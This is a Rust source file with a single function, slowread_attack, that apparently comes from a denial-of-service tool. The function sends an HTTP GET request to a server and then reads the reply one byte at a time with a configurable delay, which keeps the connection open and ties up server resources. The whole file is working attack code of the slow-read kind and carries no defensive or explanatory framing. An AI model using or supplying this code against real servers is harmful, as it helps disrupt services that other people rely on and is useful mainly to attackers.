// For std::thread::sleep_ms.
#![allow(deprecated)]

use std::io::{Write, Read};
use std::thread::sleep_ms;

/// slowread performs a GET request for / and then takes time to read each byte of it
pub fn slowread_attack<T: Sized + Read + Write>(connection: &mut T, time: u32, threadn: usize) {
    connection.write_all(b"GET / HTTP/1.0\r\n\r\n")
        .unwrap_or_else(|e| {error!("[READ:{}] !!! Couldn't write GET request: {}", threadn, e); panic!();});
    
    let mut buffer: [u8; 1] = [0];
    loop {
        sleep_ms(time);
        let result = connection.read_exact(&mut buffer);
        if let Err(e) = result {
            info!("[READ:{}] No more bytes from connection: {}", threadn, e);
            break;
        }
        else {
            debug!("[READ:{}] Got byte: {}", threadn, buffer[0]);
        }
    }
}